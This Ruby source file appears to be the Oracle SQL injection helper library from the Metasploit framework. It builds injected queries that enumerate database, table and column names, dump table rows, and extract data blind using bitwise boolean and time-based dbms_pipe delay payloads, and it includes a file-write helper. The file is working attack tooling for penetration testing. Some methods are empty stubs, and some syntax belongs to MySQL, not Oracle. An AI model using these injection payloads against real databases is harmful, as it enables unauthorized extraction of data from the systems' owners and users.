# coding: ascii-8bit

require 'base64'
#
# This class represents a Oracle Injection object, its primary purpose is to provide the common queries
# needed when performing SQL injection.
# Instanciate it only if you get the query results of your SQL injection returned on the response.
#
module Msf::Exploit::SQLi::Oraclei
  class Common < Msf::Exploit::SQLi::Common
    #
    # Encoders supported by Oracle Database
    # Keys are function names, values are decoding procs in Ruby
    #
    ENCODERS = {
      base64: {
        encode: 'utl_raw.cast_to_varchar2(utl_encode.base64_encode(utl_raw.cast_to_raw(^DATA^)))',
        decode: proc { |data| Base64.decode64(data) }
      },
      hex: {
        encode: 'rawtohex(^DATA^)',
        decode: proc { |data| Rex::Text.hex_to_raw(data) }
      },
      uuencoding: {
        encode: 'utl_raw.cast_to_varchar2(utl_encode.uuencode(utl_raw.cast_to_raw(^DATA^)))',
        decode: proc do |data|
          data = data[/^begin 0 uuencode.txt(.+) end$/, 1]
          if data.nil?
            vprint_error "uuencode decoder: didn't return a string that could be decoded"
            ''
          else
            data[-1] == 0.chr ? data.chop : data
          end
        end
      }
    }.freeze

    BIT_COUNTS = { 0 => 0, 0b1 => 1, 0b11 => 2, 0b111 => 3, 0b1111 => 4, 0b11111 => 5, 0b111111 => 6, 0b1111111 => 7, 0b11111111 => 8 }.freeze
    #
    #   See SQLi::Common#initialize
    #
    def initialize(datastore, framework, user_output, opts = {}, &query_proc)
      if opts[:encoder].is_a?(String) || opts[:encoder].is_a?(Symbol)
        # if it's a String or a Symbol, use a predefined encoder if it exists
        opts[:encoder] = opts[:encoder].downcase.intern
        opts[:encoder] = ENCODERS[opts[:encoder]] if ENCODERS[opts[:encoder]]
      end
      unless opts[:safe]
        # Only safe mode supported for now
        # Will retrieve on row at a time, the implementation using listagg still does not work
        opts[:safe] = true
      end
      super
    end

    #
    #   Query the Oracle Database version
    #   @return [String] The Oracle Database version in use
    #
    def version
      dump_table_fields('v$instance', %w[version]).flatten[0]
    end

    #
    #   Query the current database name
    #   @return [String] The name of the current database
    #
    def current_database
      dump_table_fields('v$database', %w[name]).flatten[0]
    end

    #
    #   Query the current user
    #   @return [String] The username of the current user
    #
    def current_user
      dump_table_fields('dual', %w[user]).flatten[0]
    end

    #
    #   Query the names of all the existing databases
    #   @return [Array] An array of Strings, the database names
    #
    def enum_database_names
      dump_table_fields('all_tables', %w[owner]).flatten.uniq
    end

    #
    #   Query the names of the tables in a given database
    #   @param database [String] the name of a database, or a function call, or nil for the current database
    #   @return [Array] An array of Strings, the table names in the given database
    #
    def enum_table_names(database = '')
      condition = "table_name not like '%$%' and table_name not like '%LOGMNR%'"
      condition += " and owner='#{database}'" unless database.empty?
      dump_table_fields('all_tables', %w[table_name], condition).flatten
    end

    def enum_view_names(database = '')
      # ?
    end

    #
    # Query the Oracle Database users (their username and password), this might require root privileges.
    # @return [Array] an array of arrays representing rows, where each row contains two strings, the username and password
    #
    def enum_dbms_users
      # might require root privileges
      # ?
    end

    #
    #   Query the column names of the given table in the given database
    #   @param table_name [String] the name of the table of which you want to query the column names, can be: database.table
    #   @return [Array] An array of Strings, the column names in the given table belonging to the given database
    #
    def enum_table_columns(table_name)
      if table_name.include?('.')
        database, table_name = table_name.split('.')
        condition = "table_name='#{table_name}' and owner='#{database}'"
      else
        condition = "table_name='#{table_name}'"
      end
      dump_table_fields('all_tab_columns', %w[column_name], condition).flatten
    end

    #
    #  Query the given columns of the records of the given table, that satisfy an optional condition
    #  @param table [String]  The name of the table to query
    #  @param columns [Array] The names of the columns to query
    #  @param condition [String] An optional condition, return only the rows satisfying it
    #  @param limit [Integer] An optional maximum number of results to return
    #  @return [Array] An array, where each element is an array of strings representing a row of the results
    #
    def dump_table_fields(table, columns, condition = '', num_limit = 0)
      # perhaps cast to CLOB to also retrieve binary data?
      return '' if columns.empty?

      one_column = columns.length == 1
      if one_column
        columns = "nvl(cast(#{columns.first} as varchar(4000)),'#{@null_replacement}')"
        columns = @encoder[:encode].sub(/\^DATA\^/, columns) if @encoder
      else
        columns = columns.map do |col|
          col = "nvl(cast(#{col} as varchar(4000)),'#{@null_replacement}')"
          @encoder ? @encoder[:encode].sub(/\^DATA\^/, col) : col
        end.join("||'#{@second_concat_separator}'||")
      end
      unless condition.empty?
        condition = ' where ' + condition
      end
      num_limit = num_limit.to_i
      limit = num_limit > 0 ? ' limit ' + num_limit.to_s : ''
      retrieved_data = nil
      if @safe
        # no group_concat, leak one row at a time
        row_count = run_sql("select cast(count(1) as varchar(20)) from #{table}#{condition}").to_i
        vprint_status "[?] row_count = #{row_count}"
        num_limit = row_count if num_limit == 0 || row_count < num_limit
        retrieved_data = num_limit.times.map do |current_row|
          if @truncation_length
            truncated_query("select T.me from (select T.*,rownum as rowindex from (select substr(#{columns},^OFFSET^,#{@truncation_length}) me from #{table}#{condition})T)T where rowindex=#{current_row+1}")
          else
            run_sql("select T.me from (select T.*,rownum as rowindex from (select #{columns} me from #{table}#{condition})T)T where rowindex=#{current_row+1}")
          end
        end
      else
        # if limit > 0, an alias will be necessary
        if num_limit > 0
          alias1, alias2 = 2.times.map { Rex::Text.rand_text_alpha(rand(2..9)) }
          if @truncation_length
            retrieved_data = truncated_query('select substr(listagg(' \
            "#{alias1},'#{@concat_separator}') within group(order by 1),"\
            "^OFFSET^,#{@truncation_length}) from (select #{columns} #{alias1} from #{table}"\
            "#{condition}#{limit}) #{alias2}").split(@concat_separator || ',')
          else
            retrieved_data = run_sql("select listagg(#{alias1},'#{@concat_separator}')"\
            " from (select #{columns} #{alias1} from #{table}#{condition}#{limit}) #{alias2}").split(@concat_separator || ',')
          end
        else
          if @truncation_length
            retrieved_data = truncated_query('select substr(listagg(' \
            "cast(#{columns} as binary),'#{@concat_separator}') within group(order by 1)," \
            "^OFFSET^,#{@truncation_length}) from #{table}#{condition}#{limit}").split(@concat_separator || ',')
          else
            retrieved_data = run_sql("select listagg(#{columns},'#{@concat_separator}') within group(order by 1)" \
            " from #{table}#{condition}#{limit}").split(@concat_separator || ',')
          end
        end
      end
      retrieved_data.map do |row|
        row = row.split(@second_concat_separator)
        @encoder ? row.map { |x| @encoder[:decode].call(x) } : row
      end
    end

    #
    # Checks if the target is vulnerable (if the SQL injection is working fine), by checking that
    # queries that should return known results return the results we expect from them
    #
    def test_vulnerable
      random_string_len = @truncation_length ? [rand(2..10), @truncation_length].min : rand(2..10)
      random_string = Rex::Text.rand_text_alphanumeric(random_string_len)
      run_sql("select '#{random_string}' from dual") == random_string
    end

    #
    # Attempt writing data to the file at the given path
    #
    def write_to_file(fpath, data)
      run_sql("select '#{data}' into dumpfile '#{fpath}'")
    end

    private

    #
    #  Helper method used in cases where the response is truncated.
    #  @param query [String] The SQL query to execute, where ^OFFSET^ will be replaced with an integer offset for querying
    #  @return [String] The query result
    #
    def truncated_query(query)
      result = [ ]
      offset = 1
      loop do
        slice = run_sql(query.sub(/\^OFFSET\^/, offset.to_s))
        offset += @truncation_length # should be same as @truncation_length for most cases
        result << slice
        vprint_status "{SQLi} Truncated output: #{slice} of size #{slice.size}"
        print_warning "The block returned a string larger than the truncation size : #{slice}" if slice.length > @truncation_length
        break if slice.length < @truncation_length
      end
      result.join
    end

    #
    # Checks the options specific to this DBMS
    #
    def check_opts(opts)
      unless opts[:encoder].nil? || opts[:encoder].is_a?(Hash) || ENCODERS[opts[:encoder].downcase.intern]
        raise ArgumentError, 'Unsupported encoder'
      end

      super
    end

    def call_function(function)
      function = @encoder[:encode].sub(/\^DATA\^/, function) if @encoder
      output = nil
      if @truncation_length
        output = truncated_query("select substr(#{function},^OFFSET^,#{@truncation_length}) from dual")
      else
        output = run_sql("select #{function} from dual")
      end
      output = @encoder[:decode].call(output) if @encoder
      output
    end

    def blind_detect_length(query, timebased)
      sleep_part1, sleep_part2 = '', ''
      if timebased
        sleep_part1 = "'a'=(select case when " 
        sleep_part2 = " then 'a'||dbms_pipe.receive_message(('a'),#{@sleepdelay}) else NULL end from dual)"
      end
      output_length = 0
      i = 0
      loop do
        output_bit = blind_request("#{sleep_part1}bitand(length((#{query})),#{1 << i})<>0#{sleep_part2}")
        output_length |= (1 << i) if output_bit
        i += 1
        stop = blind_request("#{sleep_part1}length((#{query}))<#{1 << i}#{sleep_part2}")
        break if stop
      end
      output_length
    end

    def blind_dump_data(query, length, known_bits, _bits_to_guess, timebased)
      sleep_part1, sleep_part2 = '', ''
      if timebased
        sleep_part1 = "'a'=(select case when "
        sleep_part2 = " then 'a'||dbms_pipe.receive_message(('a'),#{@sleepdelay}) else NULL end from dual)"
      end
      output = length.times.map do |j|
        current_character = known_bits
        8.times do |k|
          output_bit = blind_request("#{sleep_part1}bitand(ascii(substr((#{query}), #{j + 1}, 1)),#{1 << k})<>0#{sleep_part2}")
          current_character |= (1 << k) if output_bit
        end
        current_character.chr
      end.join
      output
    end

    def get_bitmask(range)
      if range.begin.is_a?(String)
        range = range.map(&:ord)
      else
        range = range.to_a
      end
      raise ArgumentError, 'Invalid range' unless range.first >= 0 && range.last <= 255

      # the low bits that change between the ascii codes
      bitmask = range.each_cons(2).inject(0) { |m, (v1, v2)| m | (v1 ^ v2) }
      # the bits that remain the same
      known_bits = range[0] & ~bitmask
      bits_to_guess = BIT_COUNTS[bitmask]
      [known_bits, bits_to_guess]
    end

    #
    #  Encodes strings in the query string as hexadecimal numbers
    #
    def hex_encode_strings(query)
      # empty strings are not encoded, they can be avoided anyway
      # for more encoding capabilities, run code at the beginning of your block
      query.gsub(/'[^']+?'|"[^"]+?"/) do |match|
        '0x' + Rex::Text.to_hex(match[1..-2], '')
      end
    end
  end
end
